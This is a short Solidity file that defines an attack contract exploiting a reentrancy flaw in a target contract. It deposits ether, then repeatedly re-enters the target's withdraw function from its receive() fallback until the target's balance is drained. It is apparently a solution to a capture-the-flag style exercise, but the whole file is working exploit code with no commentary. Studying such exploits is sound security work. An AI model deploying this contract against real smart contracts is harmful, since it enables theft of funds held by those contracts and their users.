// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract AttackReentrance {
    IReentrance reentrance;
    constructor(address _target) {
        reentrance = IReentrance(_target);
    }

    function attack() external payable {
        reentrance.donate{value:msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }

    receive() external payable {
        uint targetBalance = address(reentrance).balance;
        if (targetBalance >= 0.001 ether) {
            reentrance.withdraw(0.001 ether);
        }
    }
}
